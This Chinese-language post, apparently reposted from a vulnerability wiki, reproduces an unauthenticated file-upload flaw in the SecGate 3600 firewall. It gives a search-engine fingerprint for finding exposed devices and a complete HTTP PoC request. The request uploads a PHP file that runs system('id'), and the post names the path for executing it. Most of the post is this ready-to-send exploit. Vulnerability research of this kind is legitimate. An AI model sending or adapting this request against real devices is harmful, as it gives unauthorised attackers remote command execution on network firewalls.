---
title: "网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞"
date: 2026-10-18 09:16:43
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网神-SecGate"
tags:
  - "网神-SecGate"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限

## 漏洞影响

网神 SecGate 3600 防火墙

## 网络测绘

```
fid="1Lh1LHi6yfkhiO83I59AYg=="
```

## 漏洞复现

登录页面

![image-20230828164646671](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828164646671.png)

出现漏洞的文件 webui/modules/object/app.mds

![image-20230828164658709](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828164658709.png)

代码中没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传

![image-20230828164714010](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828164714010.png)

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /?g=obj_app_upfile HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
Content-Type: text/plain

&lt;?php &#115;ystem("id");unlink(__FILE__);?&gt;

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--</code></pre>

</details>

默认上传路径 /secgate/webui/attachements/ ， 访问 attachements/xxx.php 文件

![image-20230828164734911](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828164734911.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E7%A5%9E-SecGate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
